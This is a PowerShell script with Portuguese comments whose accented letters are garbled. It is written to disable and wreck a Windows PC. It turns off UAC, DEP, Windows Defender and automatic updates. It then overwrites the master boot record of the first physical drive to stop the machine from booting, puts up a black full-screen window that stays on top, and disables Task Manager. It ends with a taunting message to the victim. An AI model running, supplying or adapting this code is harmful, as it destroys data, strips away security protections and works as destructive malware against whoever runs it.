# Desativar UAC (Controle de Conta de Usu�rio)
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0

# Desativar Prote��o de Arquivos do Sistema (SFC)
# Nota: O comando sfc /scannow n�o tem op��es para /offbootdir e /offwindir em PowerShell; normalmente � usado apenas em CMD.
# Portanto, este comando n�o � aplic�vel diretamente no PowerShell para desativar SFC.
# Certifique-se de executar "sfc /scannow" no CMD se for necess�rio.

# Desativar Prote��o de Execu��o de Dados (DEP)
bcdedit.exe /set {current} nx AlwaysOff

# Desativar Windows Defender e outros servi�os de seguran�a
Set-MpPreference -DisableRealtimeMonitoring $true
Stop-Service -Name "WinDefend" -Force
Set-Service -Name "WinDefend" -StartupType Disabled

# Alterar permiss�es do Registro para desabilitar atualiza��es autom�ticas
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\WindowsUpdate\UX' -Name 'IsConvergedUpdateEnabled' -Value 0
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\WindowsUpdate\Auto Update' -Name 'AUOptions' -Value 1

# Excluir a MBR (Master Boot Record) para impedir o boot
# Aten��o: Isto pode tornar o sistema n�o inicializ�vel
# PREFERENCIALMENTE N�O EXECUTE ESTE COMANDO SEM TESTAR ANTES EM UM AMBIENTE SEGURO

dd if=/dev/zero of=\\.\PhysicalDrive0 bs=512 count=1

# Congelar a tela usando um formul�rio do Windows
Add-Type -AssemblyName System.Windows.Forms

# Cria uma nova janela
$form = New-Object System.Windows.Forms.Form
$form.Text = 'Congelamento de Tela'
$form.StartPosition = 'Manual'
$form.FormBorderStyle = 'None'
$form.WindowState = 'Maximized'
$form.BackColor = 'Black'
$form.TopMost = $true

# Cria um bot�o para fechar o formul�rio
$button = New-Object System.Windows.Forms.Button
$button.Text = 'Fechar'
$button.Location = New-Object System.Drawing.Point(10, 10)
$button.Add_Click({ $form.Close() })
$form.Controls.Add($button)

# Exibe o formul�rio
$form.ShowDialog()

# Bloquear o Gerenciador de Tarefas
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'DisableTaskMgr' -Value 1

# Mensagem para indicar que o Gerenciador de Tarefas foi desativado
Write-Host "Olha acho que voce se ferrou."